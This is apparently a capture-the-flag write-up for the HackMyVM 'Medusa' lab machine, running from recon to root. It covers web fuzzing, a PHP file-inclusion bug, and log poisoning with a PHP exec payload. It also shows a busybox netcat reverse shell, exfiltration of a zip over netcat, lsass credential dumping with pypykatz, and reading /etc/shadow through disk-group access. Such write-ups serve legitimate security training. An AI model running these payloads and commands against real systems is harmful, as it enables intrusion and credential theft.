# Medusa

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.189:21
Open 10.0.2.189:22
Open 10.0.2.189:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.189
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDv4Q5cpQcRXYQ70CJSzZRxXFH6tuoJTM53mCVczFIZ2Urzv0s/jbfw/HqDxogNi2VTulyIaV2Qjbif+LG4h/PV5omSnTjLbaIoHEqy1ADJk0jXsMCGy31Iezmdh70UFtjMUP+/HIGvDmpckPPKzG1/OKUnctNSHEzkIRjqCAKC9/XRdnREcKd6QEWVMk4dGlwdcCWLu6RyRGYb9ytIxO1CJI9/b911PDv1qOFRw3xEPbyXxDHQO+aKRfDWYfWHZPzi/LwDTgKZ7CuV2cz0uFE+nM+5aeIuyffkT4ViezkLNbCOlkdpi1D3fGlQhRrMtDP9mUpjENJwyB95QCdbT+yLuBkIDdNL59i4vZN2AS/L307QF6kh/37hy8scksq/eDWrxhOhhyTcATwSV9ZeiWm5O7VgIxY/8Q4GlqeSTMXY4HZS/oLu+ABvB/Rv3PVV2WEoZKgpWdgFbFpo0TRuaE7jlRa5ertqrQiCVAPAb8crAMDDaMtcmoSz/FHA5aKu45U=
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLAG2BM8Qp6PJMrgKjDrMPVgCsANoTZTePFUDsc0gYJkZUWPt04uYyBAzPuxSf6U0UQPN846rYWaBeHavSfLRKc=
|   256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN+WcY1Uu0g6LNsI0roz56ThI9v7ogotmKl2wgTviIHx
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### Fuzzing

Default nginx page, fuzz for files and folders
```bash
└─$ feroxbuster -u http://10.0.2.189 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET      368l      929w    10674c http://10.0.2.189/index.html
200      GET      368l      929w    10674c http://10.0.2.189/
301      GET        9l       28w      309c http://10.0.2.189/manual => http://10.0.2.189/manual/

└─$ feroxbuster -u http://10.0.2.189 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
200      GET      368l      929w    10674c http://10.0.2.189/
301      GET        9l       28w      309c http://10.0.2.189/manual => http://10.0.2.189/manual/
301      GET        9l       28w      308c http://10.0.2.189/hades => http://10.0.2.189/hades/
```

More fuzzing
```bash
└─$ curl http://10.0.2.189/hades/ -i
HTTP/1.1 200 OK
Date: Mon, 12 Jan 2026 22:34:55 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

```bash
└─$ feroxbuster -u http://10.0.2.189/hades/ --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x .php
200      GET        0l        0w        0c http://10.0.2.189/hades/index.php
200      GET        5l       10w      123c http://10.0.2.189/hades/d00r_validation.php
200      GET       18l       41w      555c http://10.0.2.189/hades/door.php
```

![writeup.png](/assets/pentest/hackmyvm/medusa/writeup.png)

The form limits input to 6 characters, get passwords with length of 6 and fuzz again.
```bash
└─$ grep -E '^.{6}$' $rockyou > rockyou_6.txt
└─$ ffuf -u 'http://10.0.2.189/hades/d00r_validation.php' -d 'word=FUZZ' -w ./rockyou_6.txt -H 'Content-Type: application/x-www-form-urlencoded' -fs 123
Kraken                  [Status: 200, Size: 138, Words: 11, Lines: 6, Duration: 25ms]
```

Sheesh, all this for DNS name
```bash
└─$ curl 'http://10.0.2.189/hades/d00r_validation.php' -d "word=Kraken" -s | html2markdown
medusa.hmv
```

Oh... :(

![writeup-1.png](/assets/pentest/hackmyvm/medusa/writeup-1.png)

### Dev

Still default page

![writeup-2.png](/assets/pentest/hackmyvm/medusa/writeup-2.png)

```bash
└─$ domain='medusa.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 10674
dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 11ms]
```

![writeup-3.png](/assets/pentest/hackmyvm/medusa/writeup-3.png)

```bash
└─$ feroxbuster -u http://dev.medusa.hmv/ --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
301      GET        9l       28w      317c http://dev.medusa.hmv/assets => http://dev.medusa.hmv/assets/
200      GET       25l      285w     1973c http://dev.medusa.hmv/
301      GET        9l       28w      316c http://dev.medusa.hmv/files => http://dev.medusa.hmv/files/
200      GET       25l      285w     1973c http://dev.medusa.hmv/index.html
301      GET        9l       28w      317c http://dev.medusa.hmv/manual => http://dev.medusa.hmv/manual/
200      GET       15l       81w      489c http://dev.medusa.hmv/robots.txt
```

```bash
└─$ feroxbuster -u http://dev.medusa.hmv/files/ --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET        0l        0w        0c http://dev.medusa.hmv/files/index.php
200      GET        0l        0w        0c http://dev.medusa.hmv/files/system.php
```

```bash
# Fuzz RCE, GET
ffuf -u 'http://dev.medusa.hmv/files/system.php?FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
# Fuzz RCE, POST
ffuf -u 'http://dev.medusa.hmv/files/system.php' -d 'FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
# Fuzz RCE, Cookie
ffuf -u 'http://dev.medusa.hmv/files/system.php' -b 'FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
```

### LFI

```bash
# Fuzz LFI, GET
ffuf -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 11ms]
```

```bash
└─$ curl -s 'http://dev.medusa.hmv/files/system.php?view=/etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
```

```bash
└─$ curl -so- 'http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=system.php' | base64 -d
<?php
$file = $_GET['view'];
if(isset($file)) {
	include("$file");
} else {
	include("index.php");
}
?>
```

### RCE

```bash
└─$ curl -so- 'http://dev.medusa.hmv/files/system.php?view=/var/log/apache2/access.log'

└─$ curl -so- 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log'
Mon Jan 12 17:30:20 2026 [pid 529] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:30:57 2026 [pid 532] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:08 2026 [pid 534] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:11 2026 [pid 533] [anonymous] FAIL LOGIN: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:19 2026 [pid 539] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:25 2026 [pid 541] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:25 2026 [pid 544] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:25 2026 [pid 548] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:25 2026 [pid 549] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:27 2026 [pid 545] [anonymous] FAIL LOGIN: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:27 2026 [pid 543] [anonymous] FAIL LOGIN: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:27 2026 [pid 540] [anonymous] FAIL LOGIN: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:28 2026 [pid 566] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:28 2026 [pid 568] CONNECT: Client "::ffff:10.0.2.149"
Mon Jan 12 17:31:28 2026 [pid 570] CONNECT: Client "::ffff:10.0.2.149"
```

Poison logs
```bash
└─$ ftp 10.0.2.189
Connected to 10.0.2.189.
220 (vsFTPd 3.0.3)
Name (10.0.2.189:woyag): <?php if(isset($_REQUEST[0])) { echo @exec($_REQUEST[0]); } ?>
...
ftp> exit
```

```bash
└─$ curl -so- 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&0=id'
...
Mon Jan 12 18:03:07 2026 [pid 1336] [uid=33(www-data) gid=33(www-data) groups=33(www-data)] FAIL LOGIN: Client "::ffff:10.0.2.149"
```

```bash
└─$ curl -so- 'http://dev.medusa.hmv/files/system.php' -G -d 'view=/var/log/vsftpd.log' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@medusa:/var/www/dev/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

Ha?
```bash
www-data@medusa:/var/www$ ls / -alh
total 72K
drwxr-xr-x  19 root root 4.0K Jan 15  2023 .
drwxr-xr-x  19 root root 4.0K Jan 15  2023 ..
drwxr-xr-x   2 root root 4.0K Jan 18  2023 ...
<snip>

www-data@medusa:/var/www$ ls -lah /...
total 12M
drwxr-xr-x  2 root     root     4.0K Jan 18  2023 .
drwxr-xr-x 19 root     root     4.0K Jan 15  2023 ..
-rw-------  1 www-data www-data  12M Jan 18  2023 old_files.zip
```

```bash
└─$ nc -lvnp 4445 > old_files.zip
...
www-data@medusa:/tmp$ busybox nc 10.0.2.149 4445 < /.../old_files.zip
```

```bash
└─$ 7z x old_files.zip
Enter password (will not be echoed):
```

Crack password
```bash
└─$ zip2john old_files.zip > old_files.zip.hash
```

```powershell
PS > john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
medusa666        (old_files.zip/lsass.DMP)
```

```bash
└─$ 7z x old_files.zip -p'medusa666'
  Path:     ./lsass.DMP
  
└─$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

```bash
└─$ pypykatz lsa minidump lsass.DMP --json | jq -r '.[].logon_sessions[] | . as $obj | ($obj | keys[-1]) as $last | $obj[$last].[] | "\(.username):\(.password)"' | sort | uniq
alienum:4l13num_qwerty
avijneyam:4v1jn3y4m_zxc
Claor:n0s_v0lv1m0s_4_1lusi0n4r
cromiphi:br4in_br34k3r_v2
ct0l4:b4ck3nd_pr0gr4m3r
d4t4s3c:br4in_br34k3r
InfayerTS:UnD3sc0n0c1d0
jabatron:b1zum_3_AM
LordP4:Wh1t3_h4ck
Medusa:123456
MEDUSA-PC$:null
nolo:littl3_h4ck3r
numero6:n1mb3r_s1x
powerful:p0w3rf1ll_abc
Pr0xy:pr0xy_ch41ns_456
RiJaba1:littl3_h4ck3r_v2
shelldredd:t0p_s3cr3t
sml:th3_b0ss
spectre:5p3ctr3_p0is0n_xX
```

> Creds: `spectre:5p3ctr3_p0is0n_xX`

```bash
www-data@medusa:/tmp$ su - spectre
Password:
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```bash
spectre@medusa:~$ cat user.txt
487a5d1ce02c53fbf60c3abd300d9ff5
```

## Privilege Escalation

In Linux, being part of the `disk` group typically grants you **raw read/write access to block devices** (like `/dev/sda` or `/dev/nvme0n1`). This is essentially equivalent to having **root** privileges because you can bypass the filesystem's permission model entirely.

- [https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)
- [https://www.hackingarticles.in/disk-group-privilege-escalation/](https://www.hackingarticles.in/disk-group-privilege-escalation/)

Find main partition
```bash
spectre@medusa:/$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0    8G  0 disk
├─sda1   8:1    0    7G  0 part /
├─sda2   8:2    0    1K  0 part
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom
```

Debugfs is not executable to all, since we can read it we can copy it and make it executable.
```bash
spectre@medusa:/$ find / -name debugfs -ls 2>/dev/null
     1854    236 -rwxr-xr-x   1 root     root       239264 Jun  7  2021 /usr/sbin/debugfs
spectre@medusa:/$ cp /usr/sbin/debugfs /tmp
spectre@medusa:/$ chmod +x /tmp/debugfs
```

Read files
```bash
spectre@medusa:/$ /tmp/debugfs -R "cat /root/.ssh/id_rsa" /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
/root/.ssh/id_rsa: File not found by ext2_lookup
spectre@medusa:/$ /tmp/debugfs -R "cat /root/.ssh/authorized_keys" /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
/root/.ssh/authorized_keys: File not found by ext2_lookup
spectre@medusa:/$ /tmp/debugfs -R "cat /etc/shadow" /dev/sda1 | grep '\$'
debugfs 1.46.2 (28-Feb-2021)
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
```

No SSH access, so we cracking password :(

John is not able to automatically detect hash type
```bash
└─$ john root.hash --wordlist=$rockyou
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```

Specify manually
```bash
└─$ john root.hash --wordlist=$rockyou --format=crypt
andromeda        (root)
```

> Creds: `root:andromeda`

```bash
spectre@medusa:/$ su root
Password: andromeda
root@medusa:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@medusa:/# cat /root/.rO0t.txt
34b1e6fc5e7fe0bfd56ed4b8776c9f5b
```